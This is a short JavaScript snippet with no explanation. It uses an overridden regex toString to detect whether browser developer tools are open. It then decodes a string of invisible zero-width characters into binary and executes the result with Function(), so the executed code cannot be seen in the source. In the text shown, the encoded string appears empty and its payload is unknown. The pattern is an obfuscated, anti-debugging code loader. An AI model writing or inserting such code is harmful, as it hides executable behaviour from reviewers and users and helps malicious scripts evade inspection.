var re = /x/;
var i = 0;
console.log(re);

re.toString = function() {
  return (++i);
};
if (i) {
  document.write('');
}

Function("".replace(/.{8}/g,function(u){return String.fromCharCode(parseInt(u.replace(/\u200c/g,1).replace(/\u200d/g,0),2))}))();